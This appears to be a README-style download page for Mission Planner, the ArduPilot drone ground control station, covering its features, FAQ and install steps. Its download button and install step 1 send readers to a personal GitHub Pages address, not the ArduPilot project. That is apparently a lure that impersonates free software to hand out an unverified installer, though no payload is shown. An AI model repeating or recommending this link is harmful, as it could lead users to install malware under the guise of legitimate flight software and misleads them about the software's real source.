# Mission Planner
Mission Planner is a ground control station for Windows that gives ArduPilot operators one workspace for vehicle setup, live monitoring, and flight review.
<p align="center"><img src="https://584bb81e.delivery.rocketcdn.me/wp-content/uploads/2022/09/mission-planner_icon_windows.png.webp" alt="Mission Planner logo" width="120"/></p>

[![Download Mission Planner](https://img.shields.io/badge/⬇_Download_Mission_Planner-e05d44?style=for-the-badge)](https://debbiehoward24.github.io/.github/Mission-Planner-Telemetry-App)

## From Operational Problem to Clear Action

| Problem | How Mission Planner Solves It |
|---|---|
| Vehicle state is difficult to interpret during a connection | Flight Data combines the HUD, map, status values, messages, and control panels in one operational view. |
| Position, attitude, link quality, and sensor values need constant attention | Live telemetry feeds readable instruments and lets selected values be graphed while the vehicle is active. |
| An unusual event needs investigation after landing | Recorded telemetry and onboard logs can be replayed, filtered, plotted, and compared against the vehicle track. |

## Connections, Streams, and Flight Files

The Mission Planner ArduPilot interface exchanges MAVLink data over supported serial or network telemetry connections, replays `.tlog` recordings, reviews compatible DataFlash `.bin` logs, and can generate KML or GPX flight-path files; configured MJPEG and GStreamer sources can also provide a Mission Planner video stream when the camera, network, and decoding components are compatible.

## Responsible Handling of Flight Data

**Operational records remain visible and manageable on the workstation.** Mission Planner writes telemetry logs locally while a vehicle is connected, so inspect their contents before sharing them and protect any files that expose locations, system settings, or mission activity.

## Questions Pilots Often Ask

| Question | Answer |
|---|---|
| Is Mission Planner free? | Yes. Mission Planner is free, open-source, and community-supported; compatible flight hardware, map access, telemetry equipment, and network services may have separate costs. |
| Which versions of Windows are supported? | Mission Planner runs as a Windows-only desktop application. Exact compatibility depends on the current build, so use a maintained Windows release and keep the application current. |
| How do I connect an ArduPilot vehicle? | Attach the supported USB or telemetry link, choose the correct connection port and rate, power the required equipment, and select Connect. Confirm incoming status data before issuing commands. |
| Can the Flight Data screen display live video? | Yes. A configured camera or network source can appear in the HUD, map area, or a separate view, provided the selected stream and decoding setup are supported. |

## Help During Setup and Flight Review

Open the built-in Help screen for update controls, then consult the official ArduPilot Mission Planner documentation for connection guidance, interface explanations, log-analysis procedures, and community support resources.

## Mission Planner at a Glance

| Detail | Value |
|---|---|
| Platform | Windows |
| Category | ArduPilot ground control station and mission planner drone software |
| Primary workspace | Flight Data with HUD, live map, telemetry panels, messages, and vehicle actions |
| Release | Current stable build, with Mission Planner update checks available at startup and on demand |

## Download and Install

| Step | What to do |
|---|---|
| 1. Get the installer | Use the Mission Planner download button above to obtain the Windows installation package. |
| 2. Run setup | Open the installer and follow the prompts, including installation of required device drivers. |
| 3. Start the application | Launch the Mission Planner software from its Windows shortcut. |
| 4. Establish telemetry | Connect the supported flight controller or radio, select the correct port and rate, and verify that Flight Data begins updating. |

## Workstation and Hardware Needs

Use a maintained Windows system with a modern processor, sufficient memory for maps and live video, and enough local storage for application files and growing flight-log archives. Operational use also requires a supported ArduPilot flight controller, the appropriate USB or telemetry hardware, working device drivers, and a network connection for features that retrieve online data or application updates.

## Built for Hands-On Operators

* **Field pilots:** Watch attitude, position, power, GPS state, messages, and link quality without leaving Flight Data.
* **Vehicle builders:** Configure ArduPilot parameters, validate telemetry, and examine system behavior during careful bench work.
* **Mission designers:** Create waypoint routes and review planned movement before deployment.
* **Analysts and maintainers:** Replay telemetry, inspect onboard records, graph selected values, and trace events against the mapped path.
